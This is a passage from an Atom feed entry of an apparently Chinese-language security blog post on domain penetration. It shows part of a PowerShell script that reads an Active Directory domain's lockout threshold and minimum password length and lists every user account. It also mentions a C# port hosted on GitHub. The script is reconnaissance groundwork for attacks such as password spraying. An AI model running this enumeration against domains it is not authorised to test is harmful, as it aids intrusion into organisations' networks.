class="string">"yellow"</span> <span class="string">"[*] 当前域的锁定阈值是 $(<span class="variable">$lockoutThreshold</span>)."</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$minPwdLength</span> = [int]<span class="variable">$DirEntry</span>.minPwdLength.Value</span><br><span class="line">    <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 当前域的最小密码长度是 $(<span class="variable">$minPwdLength</span>)."</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除已禁用的用户列表</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$RemoveDisabled</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"># 参考资料：http://jackstromberg.com/2013/01/useraccountcontrol-attributeflag-values/ </span></span><br><span class="line">        <span class="built_in">Write-Host</span> -ForegroundColor <span class="string">"yellow"</span> <span class="string">"[*] 从列表中删除已禁用的用户."</span></span><br><span class="line">        <span class="variable">$UserSearcher</span>.filter = <span class="string">"(&amp;(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=16)(!userAccountControl:1.2.840.113556.1.4.803:=2))"</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$UserSearcher</span>.filter = <span class="string">"(&amp;(objectCategory=person)(objectClass=user))"</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 在结果中抓取1000次</span></span><br><span class="line">    <span class="variable">$UserSearcher</span>.PageSize = <span class="number">100</span></span><br><span class="line">    <span class="variable">$AllUserObjects</span> = <span class="variable">$UserSearcher</span>.FindAll()</span><br><span class="line">    <span class="built_in">Write-Host</span> -foregroundcolor <span class="string">"yellow"</span> (<span class="string">"[*] 从当前 AD 域中成功收集了 "</span> + <span class="variable">$AllUserObjects</span>.count + <span class="string">" 个用户"</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$AllUserObjects</span>.Properties.samaccountname</span><br><span class="line">&#125;</span><br><span class="line">DomainUserList</span><br></pre></td></tr></table></figure><p><img src="/image/【域渗透】批量Net-User/blog_2019-04-18_14-19-28.png" alt=""></p><p>将代码转换成C#代码，效果如下</p><p><img src="/image/【域渗透】批量Net-User/blog_2019-04-18_15-05-37.png" alt=""></p><h3 id="3-成品"><a href="#3-成品" class="headerlink" title="3) 成品"></a>3) 成品</h3><p>其实还是有点麻瓜。</p><p>github: <a href="https://github.com/RcoIl/CSharp_Tools/tree/master/DomainUserList" target="_blank" rel="noopener">DomainUserList</a></p><h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>在域内使用<code>dsquery</code>查找的信息是有限的，所以需要相应的辅助工具，这个工具存在的意义就是人物与域用户之间的确认。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;域内批量执行 &lt;code&gt;net user Uname /domain&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="编程之道" scheme="https://rcoil.me/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E9%81%93/"/>
    
    
      <category term="内网渗透" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="域渗透" scheme="https://rcoil.me/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
      <category term="C#" scheme="https://rcoil.me/tags/C/"/>
    
      <category term="Tools" scheme="https://rcoil.me/tags/Tools/"/>
    
  </entry>
  
</feed>
